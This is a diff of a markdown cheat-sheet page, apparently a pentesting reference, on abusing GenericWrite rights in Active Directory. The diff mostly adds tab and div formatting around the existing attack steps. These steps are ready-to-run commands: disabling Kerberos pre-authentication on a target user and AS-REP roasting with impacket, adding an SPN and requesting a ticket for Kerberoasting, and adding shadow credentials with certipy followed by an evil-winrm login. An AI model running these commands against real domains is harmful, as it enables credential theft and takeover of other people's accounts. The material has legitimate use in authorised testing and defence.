@@ -7,40 +7,74 @@ tags: ["GenericWrite", "active driectory", "ad", "Windows"]
 ---
 ### Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit to target user
 
+{{< tab set1 tab1 active >}}Windows{{< /tab >}}
+{{< tabcontent set1 tab1 >}}
+
 #### 1. Import PowerView.ps1 
+
+<div>
 
 ```powershell
 . .\PowerView.ps1
 ```
 
+</div>
+
 #### 2. Check target user
+
+<div>
 
 ```powershell
 Get-DomainUser <TARGET_USER> | ConvertFrom-UACValue
 ```
 
+</div>
+
 #### 3. Add UF_DONT_REQUIRE_PREAUTH bit
+
+<div>
 
 ```powershell
 Set-DomainObject -Identity <TARGET_USER> -XOR @{useraccountcontrol=4194304} -Verbose
 ```
 
+</div>
+
 #### 4. AS-REP Roasting
+
+<div>
 
 ```bash
 # In local linux machine
 impacket-GetNPUsers <DOMAIN>/<USER> -no-pass -dc-ip <DC>
 ```
 
+</div>
+
+{{< /tabcontent >}}
+
+<br>
+
+---
+
 ### Abuse #2 : Kerberoasting by adding spn
 
-#### 1. Import PowerView.ps1 
+{{< tab set2 tab1 active >}}Windows{{< /tab >}}
+{{< tabcontent set2 tab1 >}}
+
+#### 1. Import PowerView.ps1
+
+<div>
 
 ```powershell
 . .\PowerView.ps1
 ```
 
+</div>
+
 #### 2. Create cred object (runas) \[optional\]
+
+<div>
 
 ```powershell
 $username = "<DOMAIN>\<USER>"
@@ -54,7 +88,11 @@ $password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force
 $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
 ```
 
+</div>
+
 #### 3. Add SPN
+
+<div>
 
 ```powershell
 # Add spn (e.g. MSSQL)
@@ -66,13 +104,30 @@ setspn -a MSSQLSvc/example.com:1433 <DOMAIN>\<TARGET_USER>
 Get-DomainUser <TARGET_USER> | Select serviceprincipalname
 ```
 
+</div>
+
 #### 4. Get SPN
+
+<div>
 
 ```powershell
 Get-DomainSPNTicket -SPN "MSSQLSvc/example.com:1433" -Credential $Cred
 ```
 
-### Abuse #3: Add shadow credentials (From Linux)
+</div>
+
+{{< /tabcontent >}}
+
+<br>
+
+---
+
+### Abuse #3: Add shadow credentials
+
+{{< tab set3 tab1 active >}}Linux{{< /tab >}}
+{{< tabcontent set3 tab1 >}}
+
+<div>
 
 ```bash
 # Request a ticket
@@ -98,5 +153,9 @@ certipy-ad shadow auto -username <USER>@<DOMAIN> -account <TARGET_USER> -k -targ
 # Remote with kerberos
 KRB5CCNAME=./<TARGET_USER>.ccache evil-winrm -i <TARGET_DOMAIN> -r <DOMAIN>
 ```
+
+</div>
+
+{{< /tabcontent >}}
 
 <br>
